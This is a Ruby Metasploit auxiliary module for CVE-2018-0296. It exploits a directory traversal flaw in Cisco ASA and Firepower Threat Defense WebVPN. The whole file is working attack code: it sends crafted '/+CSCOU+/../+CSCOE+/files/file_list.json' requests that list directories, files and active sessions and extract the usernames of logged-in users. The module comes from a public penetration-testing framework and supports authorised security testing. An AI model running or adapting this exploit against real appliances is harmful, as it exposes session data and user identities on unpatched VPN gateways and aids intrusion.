##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco ASA Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.
        It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users.
      },
      'Author'         => [ 'Michał Bentkowski',  # Discovery
                            'Yassine Aboukir',    # PoC
                            'Shelby Pace'         # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                           [ 'CVE', '2018-0296' ],
                           [ 'EDB', '44956' ]
                          ],
      'DisclosureDate' => 'Jun 6 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path to Cisco installation', '/' ]),
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
        Opt::RPORT(443)
      ])
  end

  def is_accessible?
    uri = normalize_uri(target_uri.path, '+CSCOE+/logon.html')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  uri
    )

    return (res && (res.body.include?("SSL VPN Service") || res.body.include?("+CSCOE+") || res.body.include?("+webvpn+") || res.body.include?("webvpnlogin")))
  end

  def list_files(path)
    uri = normalize_uri(target_uri.path, path)

    list_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  uri
    )

    if list_res && list_res.code == 200
      if list_res.body.match(/\/{3}sessions/)
        get_sessions(list_res.body)
      else
        print_good(list_res.body)
      end
    end
  end

  def get_sessions(response)
    session_nos = response.scan(/([0-9]{2,})/)

    if session_nos.empty?
      print_status("Could not detect any sessions")
      print("\n")
      return
    end

    print_good(response)
    list_users(session_nos)
  end

  def list_users(sessions)
    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
    user_ids = Array.new

    sessions.each do |session_no|
      users_res = send_request_cgi(
        'method'  =>  'GET',
        'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)
      )

      if users_res && users_res.body.include?('name')
        user_ids.push(users_res.body.match(/user:(\w+)/).to_s)
      end
    end

    unless user_ids.empty?
      print_status('Users logged in:')
      user_ids.each { |id| print_good(id) }
      print("\n")
      return
    end

    print_status("There are no users logged in currently")
  end

  def run
    file_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/'
    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
    cscoe_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b'

    paths = [file_uri, sessions_uri, cscoe_uri]

    unless is_accessible?
      fail_with(Failure::NotFound, 'Failed to reach Cisco web logon service')
    end

    paths.each { |path| list_files(path) }
  end
end
